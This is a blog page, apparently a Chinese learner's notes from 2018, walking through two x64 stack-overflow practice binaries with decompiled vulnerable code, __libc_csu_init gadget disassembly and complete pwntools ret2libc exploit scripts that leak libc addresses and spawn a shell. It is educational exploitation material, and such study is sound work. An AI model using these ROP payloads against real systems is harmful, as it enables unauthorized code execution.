@@ -1,0 +1,335 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" integrity="sha512-ygEyjMC6rqnzJqWGjRTJUPYMEs9JUOm3i7OWUS9CgQ4XkBUvMsgCS1I8JqavidQ2ClHcREB7IbA2mN08+r9Elg==" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js" integrity="sha512-9DNXrSjk17bU9MUbRp3IjwcWe46V8FaGA062PFbryPUAEQVRbz4jiZP6FW0AdbqEGtMYBDWnul3eiGBMJOQajA==" crossorigin="anonymous"></script>
+  
+  
+    <meta name="keywords" content="pwn,栈溢出," />
+  
+
+  
+    <meta name="description" content="栈溢出笔记" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/logo.png">
+  <title>栈溢出笔记 [ 4uuu Nya&#39;s HomePage ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="https://qvq.im/images/logo.png">
+    <span class="title">4uuu Nya&#39;s HomePage</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/friends" class="pure-menu-link">Friends</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        栈溢出笔记
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-11-16T16:55:14.000Z">
+        2018-11-16
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>有一段时间没写博客了，下午跟着巨佬学了点简单的栈溢出，拿其中两个例子做下笔记 ( x64</p>
+<p>在虚拟机里用socat把程序挂起来 <code>socat tcp-l:8233,fork exec:./challenge</code></p>
+<p>查找偏移的网址：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
+<p>也可以使用跃哥的 <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> ( 用着有点卡 Orz</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>第一个例子，漏洞点当然也很明显</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulfunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">  gets(&amp;v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;data:%s\n&quot;</span>, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 <code>gets</code> 这个地方存在溢出，但是程序中没有 <code>/bin/sh</code> 字符串，也没有 <code>system</code> , <code>execve</code> 等函数供我们使用，当然程序也开了NX</p>
+<p><img src="/images/20181121212534.png"></p>
+<p>程序中供使用的函数主要有两个 <code>puts</code> 与 <code>gets</code> ，这里可以使用 <code>puts</code> 来泄露出 libc 中 <code>system</code> 与 <code>/bin/sh</code> 字符串的地址</p>
+<p>因为是x64的程序，所以程序传参稍微有点不一样，因为puts仅需要一个参数，所以程序中可以很快找到一个可供使用的gadgets</p>
+<p><img src="/images/20181121212525.png"></p>
+<p>首先使用puts来泄露出一个地址供查找，这里选择了泄露gets的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;10.211.55.33&#x27;</span>, <span class="number">8233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">gets_got = p64(elf.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">pop_rdi_addr = p64(<span class="number">0x400773</span>)</span><br><span class="line">vuln_func_addr = p64(<span class="number">0x400676</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + pop_rdi_addr*<span class="number">2</span> + gets_got + puts_plt + vuln_func_addr</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line">gets_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(gets_addr)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/20181121212514.png"></p>
+<p>然后使用 <code>0x7f5c60278d80</code> 这个地址去上面的网站查找一下</p>
+<p><img src="/images/20181121212503.png"></p>
+<p>这样就得到了 <code>system</code> 函数与 <code>/bin/sh</code> 字符串的偏移，那么就可以得到他得地址了，因为 <code>system</code> 函数也只接收一个参数，所以仍然可以继续使用 <code>pop rdi;ret</code> ，完整的exp为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;10.211.55.33&#x27;</span>, <span class="number">8233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">gets_got = p64(elf.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">pop_rdi_addr = p64(<span class="number">0x400773</span>)</span><br><span class="line">vuln_func_addr = p64(<span class="number">0x400676</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + pop_rdi_addr*<span class="number">2</span> + gets_got + puts_plt + vuln_func_addr</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line">gets_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(gets_addr)</span><br><span class="line">libc_base = gets_addr - <span class="number">0x06ed80</span></span><br><span class="line">bin_sh = p64(libc_base + <span class="number">0x18cd57</span>)</span><br><span class="line">system = p64(libc_base + <span class="number">0x045390</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + pop_rdi_addr*<span class="number">2</span> + bin_sh + system*<span class="number">2</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;data:&#x27;</span> , payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这个题和上个题基本上没区别，唯一不同的地方就是 <code>gets</code> 和 <code>puts</code> 换成了 <code>read</code> 和 <code>write</code> </p>
+<p><code>main</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  vulfunc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>vulfunc</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulfunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用 <code>man 2 write</code> 可以发现它接收三个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SYNOPSIS</span><br><span class="line">     #include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">     ssize_t</span><br><span class="line">     pwrite(int fildes, const void *buf, size_t nbyte, off_t offset);</span><br><span class="line"></span><br><span class="line">     ssize_t</span><br><span class="line">     write(int fildes, const void *buf, size_t nbyte);</span><br><span class="line"></span><br><span class="line">     #include &lt;sys&#x2F;uio.h&gt;</span><br><span class="line"></span><br><span class="line">     ssize_t</span><br><span class="line">     writev(int fildes, const struct iovec *iov, int iovcnt);</span><br></pre></td></tr></table></figure>
+<p>这里的思路与上一个题一样，使用write来泄露地址，但是这里明显没有那么好用的gadgets了</p>
+<p><img src="/images/20181121212406.png"></p>
+<p>但是在程序中存在比较通用的组件，一般程序中都会存在的 <code>__libc_csu_init</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">text:0000000000400700</span><br><span class="line">.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400700                 mov     rdx, r13</span><br><span class="line">.text:0000000000400703                 mov     rsi, r14</span><br><span class="line">.text:0000000000400706                 mov     edi, r15d</span><br><span class="line">.text:0000000000400709                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040070D                 add     rbx, 1</span><br><span class="line">.text:0000000000400711                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400714                 jnz     short loc_400700</span><br><span class="line">.text:0000000000400716</span><br><span class="line">.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400716                 add     rsp, 8</span><br><span class="line">.text:000000000040071A                 pop     rbx</span><br><span class="line">.text:000000000040071B                 pop     rbp</span><br><span class="line">.text:000000000040071C                 pop     r12</span><br><span class="line">.text:000000000040071E                 pop     r13</span><br><span class="line">.text:0000000000400720                 pop     r14</span><br><span class="line">.text:0000000000400722                 pop     r15</span><br><span class="line">.text:0000000000400724                 retn</span><br><span class="line">.text:0000000000400724 ; &#125; &#x2F;&#x2F; starts at 4006C0</span><br><span class="line">.text:0000000000400724 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<p>这里可以发现，从 000000000040071A 这个地址到 0000000000400722，可以一直控制 rbx, rbp, r12, r13, r14, r15 的值</p>
+<p>然后在 0000000000400700 中，先将 r13 赋值给了 rdx，然后将 r14 赋值给了 rsi，再将 r15 赋值给了 edi ，虽然这里是edi，但是高位一般都是0，所以相当于这里完全控制了 rdi, rsi, rdx 三个寄存器的值，而 x64 的传参顺序则是前六个参数依次保存在 RDI，RSI，RDX，RCX，R8和 R9中，还有更多的参数才会保存在栈上</p>
+<p>往下走会发现 call 了 [r12+rbx*8]，然后给rbx+1，再判断rbx与rbp是否相等，不相等就跳回去循环，那么这里可以构造 rbx=0，rbp=1，r12=想要执行的函数地址，r15为第一个参数，r14为第二个参数，r13为第三个参数，然后继续往下会将rsp+8，然后又pop了6次，也就是 7 * 8 = 56 的长度，那么就可以开始构造rop链了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;10.211.55.33&#x27;</span>, <span class="number">8333</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">func, arg1, arg2, arg3</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40071A</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(func)</span><br><span class="line">    payload += p64(arg3)</span><br><span class="line">    payload += p64(arg2)</span><br><span class="line">    payload += p64(arg1)</span><br><span class="line">    payload += p64(<span class="number">0x400700</span>)</span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World&#x27;</span>, rop(elf.got[<span class="string">&#x27;write&#x27;</span>], <span class="number">0x1</span>, elf.got[<span class="string">&#x27;write&#x27;</span>] ,<span class="number">0x8</span>)+p64(<span class="number">0x400626</span>))</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = write_addr - <span class="number">0x0f72b0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x18cd57</span></span><br><span class="line">pop_rdi_addr = p64(<span class="number">0x400723</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+pop_rdi_addr+p64(bin_sh_addr)+p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<p>然后今天看到一张图 Orz</p>
+<p><img src="/images/20181121212816.png"></p>
+
+    </div>
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+<div class="share" style="width: 100%;">
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">
+    <div class="social-share" data-initialized="true">
+      <a href="#" class="social-share-icon icon-weibo"></a>
+      <a href="#" class="social-share-icon icon-qq"></a>
+      <a href="#" class="social-share-icon icon-wechat"></a>
+      <a href="#" class="social-share-icon icon-qzone"></a>
+    </div>
+  </div>
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="护网杯2018 easy_laravel出题记录">
+          护网杯2018 easy_laravel出题记录
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2018/11/26/swpuctf-2018-web-writeup/" rel="prev" title="swpuctf 2018 web writeup">
+            swpuctf 2018 web writeup
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://qvq.im">Index</a> |
+        <a class="bottom-item" href="https://github.com/sco4x0" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
